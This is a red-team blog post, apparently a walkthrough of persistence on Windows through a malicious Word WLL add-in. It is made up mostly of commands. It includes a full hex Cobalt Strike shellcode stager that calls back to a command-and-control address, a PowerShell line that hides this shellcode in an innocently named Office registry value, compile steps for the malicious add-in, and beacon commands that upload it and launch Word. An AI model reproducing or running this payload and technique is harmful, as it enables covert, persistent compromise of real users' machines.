---
title:  "office persistence"
classes: wide
header:
  teaser: /img/redteampng.png
ribbon: red
description: "office persistence"
categories:
  - Red-Teaming
toc: true
---


## What is a WLL file?
A WLL file is an add-in used by Microsoft Word, a word processing application. It contains a software component that adds new features to the program, similar to a plugin. 

## Registry query for trusted location path
find the trusted location by querying the register
```
reg query x64 HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\14.0\Word\Security\Trusted Locations\Location2
```

<img src="/img/p/office1.PNG" alt="Getting-gz" width="800" height="110"> 


## navipage to this folder with the commond
```
cd C:\Users\NoRed0x\AppData\Roaming\Microsoft\Word\Startup
```



## shellcode2ascii.py
```
if __name__ == '__main__':
    try:
	with open(sys.argv[1]) as dllFileHandle:
        	dllBytes = bytearray(dllFileHandle.read())
		dllFileHandle.close()
    except IOError:
	print("Error reading file")
    print("".join("{:02X}".format(c) for c in dllBytes))

```

## Commands for updating registry with Cobalt Strike payload
Generate payload.bin by cobalt
```
1-tap attacks >> packages >>payload generator >> select listener  +select  output >> Raw
save payload.bin
```

<img src="/img/p/2.PNG" alt="Getting-gz" width="600" height="150"> 

convert the shell code to ascii
```
python shellcode2ascii.py payload.bin
```

<img src="/img/p/shell.PNG" alt="Getting-gz" width="1000" height="200"> 


write this ascii string To the register
```
powerpick New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Office\14.0\Word" -Name "Version" -Value "FCE8890000006089E531D2648B52308B520C8B52148B72280FB74A2631FF31C0AC3C617C022C20C1CF0D01C7E2F052578B52108B423C01D08B407885C0744A01D0508B48188B582001D3E33C498B348B01D631FF31C0ACC1CF0D01C738E075F4037DF83B7D2475E2588B582401D3668B0C4B8B581C01D38B048B01D0894424245B5B61595A51FFE0585F5A8B12EB865D686E6574006877696E6954684C772607FFD531FF5757575757683A5679A7FFD5E9840000005B31C951516A035151685000000053506857899FC6FFD5EB705B31D252680002408452525253525068EB552E3BFFD589C683C35031FF57576AFF5356682D06187BFFD585C00F84C301000031FF85F6740489F9EB0968AAC5E25DFFD589C16845215E31FFD531FF576A0751565068B757E00BFFD5BF002F000039C774B731FFE991010000E9C9010000E88BFFFFFF2F6C6C354F002BB2312A1761430B3381D455FB0807B711F2588814CABD2C50149311097C21F390A44C8779B1CDFB20A0B419BEABF2EE9F8DC8105474B4275F45C0F90774BA49A0FA5313FBC8F557B100557365722D4167656E743A204D6F7A696C6C612F352E302028636F6D70617469626C653B204D53494520392E303B2057696E646F7773204E5420362E313B2054726964656E742F352E303B2046756E57656250726F64756374733B204945303030365F766572313B454E5F4742290D0A001BAC56CBB579DE36A6E84159E3D339DF245389529B860448A61F0B40789E360773983B002708575150FB8C752D73B8B06C9E9B153C371411FE936A4C554093C7BCE1BE2CAB8691FE17871655E57F58741EDCE1BC6C0C6E7FE4FAB4FDD70C99DC00DD3B73E9727A998244F149350A3EF4DF764224A06B5159A8882AE88FB0E659E0980A763DD443670F1194002E7DA4A0B56B4F63BDDD3FD4F35BAE12ED6534D19A2E945372101E501DE14A28DF3A34283DF84041A24C4492C0DEB86D5FA70068F0B5A256FFD56A4068001000006800004000576858A453E5FFD593B90000000001D9515389E7576800200000535668129689E2FFD585C074C68B0701C385C075E558C3E8A9FDFFFF3139322E3136382E3132382E313337005109BF6D" -PropertyType String -Force | Out-Null
```

<img src="/img/p/shell1.PNG" alt="Getting-gz" width="1000" height="200"> 


## verify that your value has been added
```
reg query x64 HKCU\SOFTWARE\Microsoft\Office\16.0\Word
```

<img src="/img/p/5.PNG" alt="Getting-gz" width="600" height="150"> 


##  Compiling WLL
compile the wll
```
i686-w64-mingw32-g++ -Wno-narrowing -shared wlltemplate.cpp -o update.wll
strip update.wll
```

<img src="/img/p/6.PNG" alt="Getting-gz" width="800" height="150"> 

<img src="/img/p/7.PNG" alt="Getting-gz" width="800" height="150"> 


<img src="/img/p/8.PNG" alt="Getting-gz" width="800" height="110"> 



## Upload the WLL to the Word Startup folder  using the beacon command 
```
upload /home/user/update.wll
```

## Spawn word

```
shell "C:\Program Files (x86)\Microsoft Office\Office14\winword.exe"
```

<img src="/img/p/spawn.PNG" alt="Getting-gz" width="1000" height="200"> 


<img src="/img/p/x-1.PNG" alt="Getting-gz" width="1000" height="200"> 

## If needed to kill winword
```
shell taskkill /F /IM winword.exe
```

<img src="/img/p/x.PNG" alt="Getting-gz" width="800" height="150"> 
